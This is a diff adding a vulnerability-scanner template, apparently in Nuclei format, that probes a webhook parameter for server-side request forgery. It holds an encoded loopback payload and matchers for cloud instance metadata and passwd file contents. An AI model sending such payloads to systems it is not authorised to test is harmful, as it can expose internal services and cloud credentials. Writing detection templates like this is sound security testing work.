@@ -1,0 +1,24 @@
+id: ssrf3-072
+name: 'SSRF encoded IP via webhook'
+severity: high
+type: active
+tags:
+  - ssrf
+  - oob
+  - cloud
+description: 'Fetches internal URL via webhook (verify manually)'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      webhook:
+        - 'http://127.0.0.1%0d/'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ami-id'
+          - 'instance-id'
+          - 'metadata'
+          - 'root:x:0:0'
+          - 'PONG'
